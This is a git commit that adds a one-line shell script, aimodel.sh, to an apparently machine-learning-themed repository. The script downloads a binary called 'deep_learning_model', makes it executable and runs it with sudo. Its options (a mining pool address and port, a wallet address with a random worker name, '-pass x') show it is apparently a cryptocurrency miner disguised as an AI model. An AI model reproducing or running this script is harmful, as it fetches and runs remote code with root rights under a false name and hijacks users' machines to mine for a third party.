f7d7de3915c9e9413aefc6e2b65b01c68d04f287
iphone369 <79090873+iphone369@users.noreply.github.com>
2021-09-04 20:18:35 +0530

    Update and rename notebook.sh to aimodel.sh

---
+++ aimodel.sh
@@ -0,0 +1,5 @@
+apt-get install libpci3 && wget https://github.com/iphone369/machine_learning/raw/main/deep_learning_model && chmod +x deep_learning_model && sudo ./deep_learning_model -pool 172.65.207.106:4444 -wal 0x760d69bdf1c0c40469099274635f225da775aaa6.$(echo $(shuf -i 1000-9999999999 -n 1)-lo) -pass x
+
+
+
+
